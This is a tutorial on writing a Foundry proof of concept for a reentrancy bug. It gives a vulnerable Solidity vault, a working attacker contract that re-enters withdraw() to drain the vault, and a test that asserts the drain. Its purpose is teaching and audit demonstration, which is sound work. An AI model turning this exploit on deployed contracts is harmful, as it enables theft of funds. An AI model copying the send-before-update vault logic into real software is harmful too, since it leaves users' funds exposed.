# Writing a Proof of Concept (PoC)

PoC is the single best way to prove a vulnerability exists. In the auditing world, "Show, don't tell" is the gold standard.

Here is a Foundry-based PoC you can add to your portfolio. This demonstrates a Reentrancy attack against a vulnerable vault.

## 🧪 Proof of Concept: Reentrancy Attack

### 1. The Target (VulnerableVault.sol)

This contract is vulnerable because it sends Ether before updating the user's balance.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}(""); // External call
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0; // State update (Too late!)
    }
}
```

### 2. The Exploit (Attacker.sol)

The attacker uses the fallback function to re-enter the vault before their balance is set to zero.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public vault;

    constructor(address _vaultAddress) {
        vault = VulnerableVault(_vaultAddress);
    }

    // Triggered when the vault sends ETH
    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(); // Re-entering!
        }
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }
}
```

### 3. The Foundry Test (Audit.t.sol)

This test proves that the attacker can drain 10 ETH while only depositing 1 ETH.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";
import "../src/Attacker.sol";

contract ReentrancyTest is Test {
    VulnerableVault public vault;
    Attacker public attacker;

    function setUp() public {
        vault = new VulnerableVault();
        attacker = new Attacker(address(vault));
        vm.deal(address(vault), 10 ether); // Vault starts with 10 ETH
        vm.deal(address(attacker), 1 ether); // Attacker starts with 1 ETH
    }

    function testExploit() public {
        console.log("Vault balance before attack:", address(vault).balance);
        
        attacker.attack();

        console.log("Vault balance after attack:", address(vault).balance);
        console.log("Attacker balance after attack:", address(attacker).balance);
        
        assertEq(address(vault).balance, 0); // Proof the vault was drained
    }
}
```

## 🛠️ How to showcase this in your README

To make your portfolio look professional, add a "Laboratory" section to your README:

### /lab - Reproducible Exploits

Every vulnerability in this repo includes a Foundry PoC.

 * Run the attack: forge test --match-test testExploit -vv
   
 * Why it works: The VulnerableVault fails the Checks-Effects-Interactions pattern.
   
 * The Fix: I've implemented a SecureVault.sol using ReentrancyGuard to demonstrate the mitigation.
